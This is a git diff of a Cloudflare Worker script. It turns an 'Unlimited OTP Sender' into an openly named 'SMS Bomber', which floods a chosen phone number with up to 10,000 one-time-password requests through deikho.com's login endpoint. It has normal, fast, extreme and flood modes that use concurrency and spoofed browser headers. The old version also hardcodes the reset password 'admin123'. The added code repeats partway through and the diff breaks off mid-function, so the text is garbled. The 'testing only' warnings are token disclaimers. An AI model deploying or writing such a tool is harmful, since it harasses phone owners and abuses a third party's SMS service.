@@ -1,445 +1,941 @@
-// Unlimited OTP Sender using deikho.com API (NO RATE LIMIT)
-addEventListener('fetch', event => {
-  event.respondWith(handleRequest(event.request))
-})
+// SMS Bomber API using deikho.com ONLY
+export default {
+  async fetch(request) {
+    const url = new URL(request.url);
+    const phone = url.searchParams.get('phone');
+    const qty = parseInt(url.searchParams.get('qty')) || 10;
+    const mode = url.searchParams.get('mode') || 'normal'; // normal, fast, extreme
+    const country = url.searchParams.get('country') || '92';
 
-async function handleRequest(request) {
-  const url = new URL(request.url)
-  const path = url.pathname
-  
-  // Deikho OTP API endpoint
-  const DEIKHO_API = "https://deikho.com/login?phone="
-  
-  // Store request count per phone
-  const requestCounts = new Map()
-  const MAX_REQUESTS = 100
-  
-  // ============ SEND OTP ============
-  if ((path === '/api/otp/send' || path === '/send') && request.method === 'POST') {
+    // CORS headers
+    const corsHeaders = {
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+      'Access-Control-Allow-Headers': 'Content-Type',
+      'Content-Type': 'application/json'
+    };
+
+    if (request.method === 'OPTIONS') {
+      return new Response(null, { headers: corsHeaders });
+    }
+
+    // Validate input
+    if (!phone) {
+      return new Response(
+        JSON.stringify({
+          status: 'error',
+          message: 'Phone parameter is required',
+          example: '/?phone=923001234567&qty=100&mode=fast'
+        }, null, 2),
+        { status: 400, headers: corsHeaders }
+      );
+    }
+
+    if (qty > 10000) {
+      return new Response(
+        JSON.stringify({
+          status: 'error',
+          message: 'Maximum 10000 messages allowed'
+        }, null, 2),
+        { status: 400, headers: corsHeaders }
+      );
+    }
+
     try {
-      const { phone, country_code = "92" } = await request.json()
+      const startTime = Date.now();
       
-      if (!phone) {
-        return jsonResponse({ error: "Phone number required" }, 400)
+      // Format phone number
+      const formattedPhone = formatPhoneNumber(phone, country);
+      
+      let results;
+      
+      // Select bombing mode
+      switch(mode) {
+        case 'fast':
+          results = await fastBombDeikho(formattedPhone, qty);
+          break;
+        case 'extreme':
+          results = await extremeBombDeikho(formattedPhone, qty);
+          break;
+        case 'flood':
+          results = await floodModeDeikho(formattedPhone, qty);
+          break;
+        default:
+          results = await normalBombDeikho(formattedPhone, qty);
       }
       
-      // Clean phone number
-      const cleanPhone = phone.replace(/\D/g, '')
-      
-      // Remove leading zero if present
-      let formattedPhone = cleanPhone
-      if (formattedPhone.startsWith('0')) {
-        formattedPhone = formattedPhone.substring(1)
-      }
-      
-      // Add country code if not present
-      if (!formattedPhone.startsWith(country_code)) {
-        formattedPhone = country_code + formattedPhone
-      }
-      
-      // Check request limit (100 per number)
-      const phoneKey = `phone:${formattedPhone}`
-      const currentCount = requestCounts.get(phoneKey) || 0
-      
-      if (currentCount >= MAX_REQUESTS) {
-        return jsonResponse({ 
-          error: "Maximum OTP limit reached (100 per number)",
+      const totalTime = Date.now() - startTime;
+
+      return new Response(
+        JSON.stringify({
+          status: 'success',
           phone: formattedPhone,
-          requests_used: currentCount,
-          max_allowed: MAX_REQUESTS
-        }, 429)
-      }
+          quantity: qty,
+          mode: mode,
+          api_used: 'deikho.com ONLY',
+          messages_sent: results.successful,
+          failed: results.failed,
+          success_rate: `${((results.successful / qty) * 100).toFixed(1)}%`,
+          total_time: `${totalTime}ms`,
+          speed: `${(qty / (totalTime / 1000)).toFixed(2)} requests/sec`,
+          average_response_time: `${(totalTime / qty).toFixed(0)}ms per request`,
+          results: results.details,
+          timestamp: new Date().toISOString(),
+          api_endpoint: 'https://deikho.com/login?phone=',
+          warning: 'Use responsibly - Only for testing purposes!'
+        }, null, 2),
+        { headers: corsHeaders }
+      );
+
+    } catch (error) {
+      return new Response(
+        JSON.stringify({
+          status: 'error',
+          message: error.message,
+          api: 'deikho.com',
+          timestamp: new Date().toISOString()
+        }, null, 2),
+        { status: 500, headers: corsHeaders }
+      );
+    }
+  }
+};
+
+// Format phone number
+function formatPhoneNumber(phone, countryCode) {
+  // Remove all non-digits
+  let cleaned = phone.replace(/\D/g, '');
+  
+  // Remove leading zero
+  if (cleaned.startsWith('0')) {
+    cleaned = cleaned.substring(1);
+  }
+  
+  // Add country code if not present
+  if (!cleaned.startsWith(countryCode)) {
+    cleaned = countryCode + cleaned;
+  }
+  
+  return cleaned;
+}
+
+// Normal bombing mode
+async function normalBombDeikho(phone, quantity) {
+  const results = [];
+  let successful = 0;
+  let failed = 0;
+  
+  const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
+  
+  for (let i = 0; i < quantity; i++) {
+    try {
+      const start = Date.now();
       
-      // Call Deikho API
-      const apiUrl = `${DEIKHO_API}${formattedPhone}`
-      
-      console.log("Calling Deikho API:", apiUrl)
-      
-      const response = await fetch(apiUrl, {
+      const response = await fetch(DEIKHO_API, {
         method: 'GET',
         headers: {
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-          'Accept': 'application/json, text/plain, */*',
-          'Accept-Language': 'en-US,en;q=0.9',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+          'Accept-Language': 'en-US,en;q=0.5',
           'Referer': 'https://deikho.com/',
-          'Origin': 'https://deikho.com'
+          'Origin': 'https://deikho.com',
+          'Cache-Control': 'no-cache',
+          'Pragma': 'no-cache'
         }
-      })
+      });
       
-      // Update request count
-      requestCounts.set(phoneKey, currentCount + 1)
+      const responseTime = Date.now() - start;
       
-      // Try to parse response
-      let responseData
-      const contentType = response.headers.get('content-type')
-      
-      if (contentType && contentType.includes('application/json')) {
-        responseData = await response.json()
+      if (response.ok) {
+        successful++;
+        results.push({
+          attempt: i + 1,
+          status: 'success',
+          response_time: `${responseTime}ms`,
+          status_code: response.status
+        });
       } else {
-        const text = await response.text()
-        try {
-          responseData = JSON.parse(text)
-        } catch {
-          responseData = { raw_response: text, status: response.status }
-        }
+        failed++;
+        results.push({
+          attempt: i + 1,
+          status: 'failed',
+          status_code: response.status,
+          response_time: `${responseTime}ms`
+        });
       }
       
-      return jsonResponse({
-        success: true,
-        message: "OTP request sent successfully",
-        phone: formattedPhone,
-        api_used: "deikho.com",
-        request_count: currentCount + 1,
-        max_allowed: MAX_REQUESTS,
-        remaining_requests: MAX_REQUESTS - (currentCount + 1),
-        timestamp: new Date().toISOString(),
-        response: responseData,
-        api_url: apiUrl
-      })
+      // Small delay between requests (100ms)
+      if (i < quantity - 1) {
+        await new Promise(resolve => setTimeout(resolve, 100));
+      }
       
     } catch (error) {
-      console.error("Send OTP error:", error)
-      return jsonResponse({ 
-        error: "Failed to send OTP", 
-        details: error.message,
-        stack: error.stack 
-      }, 500)
+      failed++;
+      results.push({
+        attempt: i + 1,
+        status: 'error',
+        error: error.message
+      });
     }
   }
   
-  // ============ BULK SEND OTP (Unlimited) ============
-  if ((path === '/api/otp/bulk' || path === '/bulk') && request.method === 'POST') {
-    try {
-      const { phones, country_code = "92", delay = 100 } = await request.json()
+  return {
+    successful: successful,
+    failed: failed,
+    details: results.slice(0, 20) // Show only first 20 attempts
+  };
+}
+
+// Fast bombing mode (concurrent)
+async function fastBombDeikho(phone, quantity) {
+  const BATCH_SIZE = 10;
+  const CONCURRENT = 5;
+  const results = [];
+  let totalSuccessful = 0;
+  
+  const batches = Math.ceil(quantity / BATCH_SIZE);
+  
+  for (let batch = 0; batch < batches; batch++) {
+    const currentBatch = Math.min(BATCH_SIZE, quantity - (batch * BATCH_SIZE));
+    
+    const batchPromises = [];
+    
+    // Create concurrent requests
+    for (let i = 0; i < CONCURRENT && i < currentBatch; i++) {
+      const requestIndex = (batch * BATCH_SIZE) + i;
+      if (requestIndex >= quantity) break;
       
-      if (!phones || !Array.isArray(phones) || phones.length === 0) {
-        return jsonResponse({ error: "Array of phone numbers required" }, 400)
-      }
-      
-      // No limit on bulk size - unlimited
-      const results = []
-      const failed = []
-      
-      // Process each phone
-      for (const phone of phones) {
-        try {
-          const cleanPhone = phone.replace(/\D/g, '')
-          
-          // Remove leading zero if present
-          let formattedPhone = cleanPhone
-          if (formattedPhone.startsWith('0')) {
-            formattedPhone = formattedPhone.substring(1)
-          }
-          
-          // Add country code if not present
-          if (!formattedPhone.startsWith(country_code)) {
-            formattedPhone = country_code + formattedPhone
-          }
-          
-          // Check request limit
-          const phoneKey = `phone:${formattedPhone}`
-          const currentCount = requestCounts.get(phoneKey) || 0
-          
-          if (currentCount >= MAX_REQUESTS) {
-            results.push({
-              phone: formattedPhone,
-              success: false,
-              error: "Maximum limit reached (100)",
-              request_count: currentCount
-            })
-            continue
-          }
-          
-          // Call API
-          const apiUrl = `${DEIKHO_API}${formattedPhone}`
-          
-          const response = await fetch(apiUrl, {
-            method: 'GET',
-            headers: {
-              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-              'Accept': 'application/json, text/plain, */*'
-            }
-          })
-          
-          // Update count
-          requestCounts.set(phoneKey, currentCount + 1)
-          
-          let responseData
+      batchPromises.push(
+        (async () => {
           try {
-            const text = await response.text()
-            responseData = text
-          } catch (e) {
-            responseData = "No response text"
+            const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
+            const response = await fetch(DEIKHO_API, {
+              headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': '*/*'
+              }
+            });
+            
+            return {
+              attempt: requestIndex + 1,
+              success: response.ok,
+              status: response.status
+            };
+          } catch (error) {
+            return {
+              attempt: requestIndex + 1,
+              success: false,
+              error: error.message
+            };
           }
-          
-          results.push({
-            phone: formattedPhone,
-            success: response.ok,
-            status: response.status,
-            request_count: currentCount + 1,
-            response: responseData
-          })
-          
-          // Add delay between requests to avoid blocking
-          if (delay > 0) {
-            await new Promise(resolve => setTimeout(resolve, delay))
-          }
-          
-        } catch (error) {
-          failed.push({
-            phone: phone,
-            error: error.message
-          })
-          results.push({
-            phone: phone,
-            success: false,
-            error: error.message
-          })
+        })()
+      );
+    }
+    
+    const batchResults = await Promise.allSettled(batchPromises);
+    
+    batchResults.forEach(result => {
+      if (result.value) {
+        if (result.value.success) {
+          totalSuccessful++;
         }
+        results.push(result.value);
       }
-      
-      return jsonResponse({
-        success: true,
-        total_numbers: phones.length,
-        processed: results.length,
-        successful: results.filter(r => r.success).length,
-        failed: results.filter(r => !r.success).length,
-        results: results,
-        failed_details: failed,
-        timestamp: new Date().toISOString(),
-        note: "No rate limit - Unlimited requests possible"
-      })
-      
-    } catch (error) {
-      console.error("Bulk send error:", error)
-      return jsonResponse({ 
-        error: "Failed to send bulk OTPs", 
-        details: error.message 
-      }, 500)
+    });
+    
+    // Tiny delay between batches
+    if (batch < batches - 1) {
+      await new Promise(resolve => setTimeout(resolve, 50));
     }
   }
   
-  // ============ CHECK PHONE STATUS ============
-  if ((path === '/api/otp/status' || path === '/status') && request.method === 'GET') {
-    const phone = url.searchParams.get('phone')
-    
-    if (!phone) {
-      // Show all counts
-      const allCounts = {}
-      for (const [key, count] of requestCounts.entries()) {
-        const phoneNum = key.replace('phone:', '')
-        allCounts[phoneNum] = {
-          requests: count,
-          remaining: MAX_REQUESTS - count,
-          percentage: Math.round((count / MAX_REQUESTS) * 100)
-        }
-      }
-      
-      return jsonResponse({
-        status: "active",
-        total_unique_numbers: requestCounts.size,
-        max_requests_per_number: MAX_REQUESTS,
-        note: "NO RATE LIMIT - Only 100 requests per number limit",
-        all_counts: allCounts
-      })
-    }
-    
-    // Check specific phone
-    const cleanPhone = phone.replace(/\D/g, '')
-    const phoneKey = `phone:${cleanPhone}`
-    const count = requestCounts.get(phoneKey) || 0
-    
-    return jsonResponse({
-      phone: cleanPhone,
-      requests_sent: count,
-      requests_remaining: MAX_REQUESTS - count,
-      max_allowed: MAX_REQUESTS,
-      can_send_more: count < MAX_REQUESTS,
-      percentage_used: Math.round((count / MAX_REQUESTS) * 100) + "%",
-      last_check: new Date().toISOString()
-    })
-  }
+  return {
+    successful: totalSuccessful,
+    failed: quantity - totalSuccessful,
+    details: results.slice(0, 15)
+  };
+}
+
+// Extreme bombing mode (maximum speed)
+async function extremeBombDeikho(phone, quantity) {
+  const MAX_CONCURRENT = 20;
+  const results = [];
+  let successful = 0;
   
-  // ============ RESET COUNTERS ============
-  if ((path === '/api/otp/reset' || path === '/reset') && request.method === 'POST') {
-    const { phone, password = "admin123" } = await request.json()
-    
-    // Simple password protection
-    if (password !== "admin123") {
-      return jsonResponse({ error: "Invalid password" }, 401)
-    }
-    
-    if (phone) {
-      const cleanPhone = phone.replace(/\D/g, '')
-      const phoneKey = `phone:${cleanPhone}`
-      
-      if (requestCounts.has(phoneKey)) {
-        requestCounts.delete(phoneKey)
-        return jsonResponse({
-          success: true,
-          message: `Counter reset for ${cleanPhone}`,
-          phone: cleanPhone
-        })
-      } else {
-        return jsonResponse({
-          success: false,
-          message: `No record found for ${cleanPhone}`
-        }, 404)
-      }
-    } else {
-      // Reset all
-      const previousSize = requestCounts.size
-      requestCounts.clear()
-      
-      return jsonResponse({
-        success: true,
-        message: `All counters reset (${previousSize} numbers cleared)`,
-        numbers_cleared: previousSize
-      })
-    }
-  }
+  // Create all promises at once
+  const promises = [];
   
-  // ============ SPAM MODE (Unlimited flooding) ============
-  if ((path === '/api/otp/flood' || path === '/flood') && request.method === 'POST') {
-    try {
-      const { phone, count = 10, delay = 50 } = await request.json()
-      
-      if (!phone) {
-        return jsonResponse({ error: "Phone number required" }, 400)
-      }
-      
-      const cleanPhone = phone.replace(/\D/g, '')
-      const phoneKey = `phone:${cleanPhone}`
-      const currentCount = requestCounts.get(phoneKey) || 0
-      
-      // Calculate how many more we can send
-      const remainingSlots = MAX_REQUESTS - currentCount
-      const actualCount = Math.min(count, remainingSlots)
-      
-      if (actualCount <= 0) {
-        return jsonResponse({
-          error: "Maximum limit already reached",
-          phone: cleanPhone,
-          requests_sent: currentCount,
-          max_allowed: MAX_REQUESTS
-        }, 429)
-      }
-      
-      const results = []
-      
-      // Send multiple OTPs rapidly
-      for (let i = 0; i < actualCount; i++) {
+  for (let i = 0; i < quantity; i++) {
+    promises.push(
+      (async (index) => {
         try {
-          const apiUrl = `${DEIKHO_API}${cleanPhone}`
-          
-          const response = await fetch(apiUrl, {
-            method: 'GET',
+          const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
+          const response = await fetch(DEIKHO_API, {
             headers: {
-              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+              'User-Agent': `Mozilla/5.0 (Request-${index})`,
+              'Accept': '*/*'
+            },
+            cf: {
+              // Cloudflare optimizations
+              cacheTtl: 0,
+              cacheEverything: false,
+              polish: 'off'
             }
-          })
+          });
           
-          results.push({
-            attempt: i + 1,
-            success: response.ok,
+          const success = response.ok;
+          if (success) successful++;
+          
+          return {
+            attempt: index + 1,
+            success: success,
             status: response.status
-          })
-          
-          // Small delay between requests
-          if (delay > 0 && i < actualCount - 1) {
-            await new Promise(resolve => setTimeout(resolve, delay))
-          }
-          
+          };
         } catch (error) {
-          results.push({
-            attempt: i + 1,
+          return {
+            attempt: index + 1,
             success: false,
             error: error.message
-          })
+          };
         }
+      })(i)
+    );
+    
+    // Control concurrency
+    if (promises.length >= MAX_CONCURRENT || i === quantity - 1) {
+      const batchResults = await Promise.allSettled(promises);
+      batchResults.forEach(result => {
+        if (result.value) {
+          results.push(result.value);
+        }
+      });
+      promises.length = 0; // Clear array
+    }
+  }
+  
+  return {
+    successful: successful,
+    failed: quantity - successful,
+    details: results.slice(0, 10) // Show only first 10
+  };
+}
+
+// Flood mode (continuous requests)
+async function floodModeDeikho(phone, quantity) {
+  const DURATION = 30000; // 30 seconds flood
+  const startTime = Date.now();
+  const endTime = startTime + DURATION;
+  
+  const results = [];
+  let successful = 0;
+  let attempts = 0;
+  
+  // Keep sending until time runs out or quantity reached
+  while (Date.now() < endTime && attempts < quantity) {
+    attempts++;
+    
+    try {
+      const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
+      const response = await fetch(DEIKHO_API, {
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Flood-Mode)',
+          'Accept': '*/*'
+        }
+      });
+      
+      if (response.ok) {
+        successful++;
       }
       
-      // Update counter
-      requestCounts.set(phoneKey, currentCount + actualCount)
+      // Log every 10th attempt
+      if (attempts % 10 === 0) {
+        results.push({
+          batch: attempts / 10,
+          time_elapsed: `${Date.now() - startTime}ms`,
+          successful_so_far: successful,
+          attempts_so_far: attempts
+        });
+      }
       
-      return jsonResponse({
-        success: true,
-        message: `Sent ${actualCount} OTP requests to ${cleanPhone}`,
-        phone: cleanPhone,
-        requested: count,
-        sent: actualCount,
-        total_requests_now: currentCount + actualCount,
-        remaining_requests: MAX_REQUESTS - (currentCount + actualCount),
-        results: results,
-        timestamp: new Date().toISOString(),
-        warning: "Use responsibly - This is for testing only!"
-      })
+      // No delay - maximum speed
       
     } catch (error) {
-      return jsonResponse({ 
-        error: "Flood failed", 
-        details: error.message 
-      }, 500)
+      // Continue despite errors
     }
+    
+    // Break if we reached quantity
+    if (attempts >= quantity) break;
   }
   
-  // ============ API DOCUMENTATION ============
-  if (path === '/' || path === '/help') {
-    return jsonResponse({
-      api_name: "Unlimited OTP Sender API",
-      version: "2.0",
-      backend_api: "https://deikho.com/login?phone=",
-      features: [
-        "NO RATE LIMITING",
-        "Maximum 100 requests per phone number",
-        "Unlimited bulk sending",
-        "Flood mode for testing",
-        "Real-time counters"
-      ],
-      endpoints: {
-        "POST /api/otp/send": "Send OTP to single number",
-        "POST /api/otp/bulk": "Send OTP to unlimited numbers",
-        "POST /api/otp/flood": "Spam/flood mode (multiple to one number)",
-        "GET /api/otp/status": "Check request counts",
-        "POST /api/otp/reset": "Reset counters (password: admin123)"
-      },
-      examples: {
-        single_send: 'curl -X POST https://your-worker.workers.dev/send -H "Content-Type: application/json" -d \'{"phone": "3012345678"}\'',
-        bulk_send: 'curl -X POST https://your-worker.workers.dev/bulk -H "Content-Type: application/json" -d \'{"phones": ["3012345678", "3112345678", "3212345678"]}\'',
-        flood_mode: 'curl -X POST https://your-worker.workers.dev/flood -H "Content-Type: application/json" -d \'{"phone": "3012345678", "count": 20}\''
-      },
-      note: "⚠️ Use responsibly! Maximum 100 requests per phone number limit."
-    })
-  }
+  const actualQuantity = Math.min(attempts, quantity);
   
-  // ============ 404 NOT FOUND ============
-  return jsonResponse({
-    error: "Endpoint not found",
-    available_endpoints: [
-      "/send", 
-      "/bulk", 
-      "/flood", 
-      "/status", 
-      "/reset", 
-      "/help"
-    ]
-  }, 404)
+  return {
+    successful: successful,
+    failed: actualQuantity - successful,
+    details: [{
+      mode: 'flood',
+      duration: `${Date.now() - startTime}ms`,
+      total_attempts: attempts,
+      successful: successful,
+      failed: attempts - successful,
+      requests_per_second: (attempts / ((Date.now() - startTime) / 1000)).toFixed(2)
+    }]
+  };
 }
 
-function jsonResponse(data, status = 200) {
-  return new Response(JSON.stringify(data, null, 2), {
-    status: status,
-    headers: {
-      'Content-Type': 'application/json',
+// Health check with deikho.com test
+async function healthCheck() {
+  try {
+    const testPhone = '923001234567'; // Test number
+    const DEIKHO_API = `https://deikho.com/login?phone=${testPhone}`;
+    
+    const response = await fetch(DEIKHO_API, {
+      headers: {
+        'User-Agent': 'Health-Check/1.0'
+      }
+    });
+    
+    return {
+      deikho_api: 'online',
+      status_code: response.status,
+      response_time: 'tested'
+    };
+  } catch (error) {
+    return {
+      deikho_api: 'offline',
+      error: error.message
+    };
+  }
+}
+
+// Additional endpoint for API info
+addEventListener('fetch', event => {
+  const url = new URL(event.request.url);
+  
+  // Health check endpoint
+  if (url.pathname === '/health' || url.pathname === '/status') {
+    event.respondWith(new Response(JSON.stringify({
+      status: 'online',
+      service: 'Deikho.com SMS Bomber',
+      version: '1.0',
+      api_endpoint: 'https://deikho.com/login?phone=',
+      limits: {
+        max_messages: 10000,
+        modes: ['normal', 'fast', 'extreme', 'flood'],
+        supported_countries: ['92', '1', '44', '91']
+      },
+      usage: '/?phone=PHONE&qty=QUANTITY&mode=MODE&country=CODE',
+      example: '/?phone=3012345678&qty=100&mode=fast&country=92',
+      timestamp: new Date().toISOString()
+    }, null, 2), {
+      headers: {
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*'
+      }
+    }));
+  }
+  
+  // Simple test endpoint
+  if (url.pathname === '/test') {
+    const testPhone = url.searchParams.get('phone') || '923001234567';
+    event.respondWith(handleTest(testPhone));
+  }
+});
+
+async function handleTest(phone) {
+  try {
+    const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
+    const response = await fetch(DEIKHO_API);
+    
+    return new Response(JSON.stringify({
+      test: 'success',
+      phone: phone,
+      api: 'deikho.com',
+      status: response.status,
+      working: response.ok
+    }, null, 2), {
+      headers: {
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*'
+      }
+    });
+  } catch (error) {
+    return new Response(JSON.stringify({
+      test: 'failed',
+      error: error.message
+    }, null, 2), {
+      status: 500,
+      headers: { 'Content-Type': 'application/json' }
+    });
+  }
+}// SMS Bomber API using deikho.com ONLY
+export default {
+  async fetch(request) {
+    const url = new URL(request.url);
+    const phone = url.searchParams.get('phone');
+    const qty = parseInt(url.searchParams.get('qty')) || 10;
+    const mode = url.searchParams.get('mode') || 'normal'; // normal, fast, extreme
+    const country = url.searchParams.get('country') || '92';
+
+    // CORS headers
+    const corsHeaders = {
       'Access-Control-Allow-Origin': '*',
-      'X-Unlimited-OTP': 'true',
-      'X-Max-Per-Number': '100'
+      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+      'Access-Control-Allow-Headers': 'Content-Type',
+      'Content-Type': 'application/json'
+    };
+
+    if (request.method === 'OPTIONS') {
+      return new Response(null, { headers: corsHeaders });
     }
-  })
+
+    // Validate input
+    if (!phone) {
+      return new Response(
+        JSON.stringify({
+          status: 'error',
+          message: 'Phone parameter is required',
+          example: '/?phone=923001234567&qty=100&mode=fast'
+        }, null, 2),
+        { status: 400, headers: corsHeaders }
+      );
+    }
+
+    if (qty > 10000) {
+      return new Response(
+        JSON.stringify({
+          status: 'error',
+          message: 'Maximum 10000 messages allowed'
+        }, null, 2),
+        { status: 400, headers: corsHeaders }
+      );
+    }
+
+    try {
+      const startTime = Date.now();
+      
+      // Format phone number
+      const formattedPhone = formatPhoneNumber(phone, country);
+      
+      let results;
+      
+      // Select bombing mode
+      switch(mode) {
+        case 'fast':
+          results = await fastBombDeikho(formattedPhone, qty);
+          break;
+        case 'extreme':
+          results = await extremeBombDeikho(formattedPhone, qty);
+          break;
+        case 'flood':
+          results = await floodModeDeikho(formattedPhone, qty);
+          break;
+        default:
+          results = await normalBombDeikho(formattedPhone, qty);
+      }
+      
+      const totalTime = Date.now() - startTime;
+
+      return new Response(
+        JSON.stringify({
+          status: 'success',
+          phone: formattedPhone,
+          quantity: qty,
+          mode: mode,
+          api_used: 'deikho.com ONLY',
+          messages_sent: results.successful,
+          failed: results.failed,
+          success_rate: `${((results.successful / qty) * 100).toFixed(1)}%`,
+          total_time: `${totalTime}ms`,
+          speed: `${(qty / (totalTime / 1000)).toFixed(2)} requests/sec`,
+          average_response_time: `${(totalTime / qty).toFixed(0)}ms per request`,
+          results: results.details,
+          timestamp: new Date().toISOString(),
+          api_endpoint: 'https://deikho.com/login?phone=',
+          warning: 'Use responsibly - Only for testing purposes!'
+        }, null, 2),
+        { headers: corsHeaders }
+      );
+
+    } catch (error) {
+      return new Response(
+        JSON.stringify({
+          status: 'error',
+          message: error.message,
+          api: 'deikho.com',
+          timestamp: new Date().toISOString()
+        }, null, 2),
+        { status: 500, headers: corsHeaders }
+      );
+    }
+  }
+};
+
+// Format phone number
+function formatPhoneNumber(phone, countryCode) {
+  // Remove all non-digits
+  let cleaned = phone.replace(/\D/g, '');
+  
+  // Remove leading zero
+  if (cleaned.startsWith('0')) {
+    cleaned = cleaned.substring(1);
+  }
+  
+  // Add country code if not present
+  if (!cleaned.startsWith(countryCode)) {
+    cleaned = countryCode + cleaned;
+  }
+  
+  return cleaned;
 }
 
-// Auto-clean old entries (optional - keeps memory clean)
-setInterval(() => {
-  // Keep all entries - no auto-clean since we want to track 100 limit
-  console.log(`Currently tracking ${requestCounts.size} phone numbers`)
-}, 60000) // Log every minute
+// Normal bombing mode
+async function normalBombDeikho(phone, quantity) {
+  const results = [];
+  let successful = 0;
+  let failed = 0;
+  
+  const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
+  
+  for (let i = 0; i < quantity; i++) {
+    try {
+      const start = Date.now();
+      
+      const response = await fetch(DEIKHO_API, {
+        method: 'GET',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+          'Accept-Language': 'en-US,en;q=0.5',
+          'Referer': 'https://deikho.com/',
+          'Origin': 'https://deikho.com',
+          'Cache-Control': 'no-cache',
+          'Pragma': 'no-cache'
+        }
+      });
+      
+      const responseTime = Date.now() - start;
+      
+      if (response.ok) {
+        successful++;
+        results.push({
+          attempt: i + 1,
+          status: 'success',
+          response_time: `${responseTime}ms`,
+          status_code: response.status
+        });
+      } else {
+        failed++;
+        results.push({
+          attempt: i + 1,
+          status: 'failed',
+          status_code: response.status,
+          response_time: `${responseTime}ms`
+        });
+      }
+      
+      // Small delay between requests (100ms)
+      if (i < quantity - 1) {
+        await new Promise(resolve => setTimeout(resolve, 100));
+      }
+      
+    } catch (error) {
+      failed++;
+      results.push({
+        attempt: i + 1,
+        status: 'error',
+        error: error.message
+      });
+    }
+  }
+  
+  return {
+    successful: successful,
+    failed: failed,
+    details: results.slice(0, 20) // Show only first 20 attempts
+  };
+}
+
+// Fast bombing mode (concurrent)
+async function fastBombDeikho(phone, quantity) {
+  const BATCH_SIZE = 10;
+  const CONCURRENT = 5;
+  const results = [];
+  let totalSuccessful = 0;
+  
+  const batches = Math.ceil(quantity / BATCH_SIZE);
+  
+  for (let batch = 0; batch < batches; batch++) {
+    const currentBatch = Math.min(BATCH_SIZE, quantity - (batch * BATCH_SIZE));
+    
+    const batchPromises = [];
+    
+    // Create concurrent requests
+    for (let i = 0; i < CONCURRENT && i < currentBatch; i++) {
+      const requestIndex = (batch * BATCH_SIZE) + i;
+      if (requestIndex >= quantity) break;
+      
+      batchPromises.push(
+        (async () => {
+          try {
+            const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
+            const response = await fetch(DEIKHO_API, {
+              headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': '*/*'
+              }
+            });
+            
+            return {
+              attempt: requestIndex + 1,
+              success: response.ok,
+              status: response.status
+            };
+          } catch (error) {
+            return {
+              attempt: requestIndex + 1,
+              success: false,
+              error: error.message
+            };
+          }
+        })()
+      );
+    }
+    
+    const batchResults = await Promise.allSettled(batchPromises);
+    
+    batchResults.forEach(result => {
+      if (result.value) {
+        if (result.value.success) {
+          totalSuccessful++;
+        }
+        results.push(result.value);
+      }
+    });
+    
+    // Tiny delay between batches
+    if (batch < batches - 1) {
+      await new Promise(resolve => setTimeout(resolve, 50));
+    }
+  }
+  
+  return {
+    successful: totalSuccessful,
+    failed: quantity - totalSuccessful,
+    details: results.slice(0, 15)
+  };
+}
+
+// Extreme bombing mode (maximum speed)
+async function extremeBombDeikho(phone, quantity) {
+  const MAX_CONCURRENT = 20;
+  const results = [];
+  let successful = 0;
+  
+  // Create all promises at once
+  const promises = [];
+  
+  for (let i = 0; i < quantity; i++) {
+    promises.push(
+      (async (index) => {
+        try {
+          const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
+          const response = await fetch(DEIKHO_API, {
+            headers: {
+              'User-Agent': `Mozilla/5.0 (Request-${index})`,
+              'Accept': '*/*'
+            },
+            cf: {
+              // Cloudflare optimizations
+              cacheTtl: 0,
+              cacheEverything: false,
+              polish: 'off'
+            }
+          });
+          
+          const success = response.ok;
+          if (success) successful++;
+          
+          return {
+            attempt: index + 1,
+            success: success,
+            status: response.status
+          };
+        } catch (error) {
+          return {
+            attempt: index + 1,
+            success: false,
+            error: error.message
+          };
+        }
+      })(i)
+    );
+    
+    // Control concurrency
+    if (promises.length >= MAX_CONCURRENT || i === quantity - 1) {
+      const batchResults = await Promise.allSettled(promises);
+      batchResults.forEach(result => {
+        if (result.value) {
+          results.push(result.value);
+        }
+      });
+      promises.length = 0; // Clear array
+    }
+  }
+  
+  return {
+    successful: successful,
+    failed: quantity - successful,
+    details: results.slice(0, 10) // Show only first 10
+  };
+}
+
+// Flood mode (continuous requests)
+async function floodModeDeikho(phone, quantity) {
+  const DURATION = 30000; // 30 seconds flood
+  const startTime = Date.now();
+  const endTime = startTime + DURATION;
+  
+  const results = [];
+  let successful = 0;
+  let attempts = 0;
+  
+  // Keep sending until time runs out or quantity reached
+  while (Date.now() < endTime && attempts < quantity) {
+    attempts++;
+    
+    try {
+      const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
+      const response = await fetch(DEIKHO_API, {
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Flood-Mode)',
+          'Accept': '*/*'
+        }
+      });
+      
+      if (response.ok) {
+        successful++;
+      }
+      
+      // Log every 10th attempt
+      if (attempts % 10 === 0) {
+        results.push({
+          batch: attempts / 10,
+          time_elapsed: `${Date.now() - startTime}ms`,
+          successful_so_far: successful,
+          attempts_so_far: attempts
+        });
+      }
+      
+      // No delay - maximum speed
+      
+    } catch (error) {
+      // Continue despite errors
+    }
+    
+    // Break if we reached quantity
+    if (attempts >= quantity) break;
+  }
+  
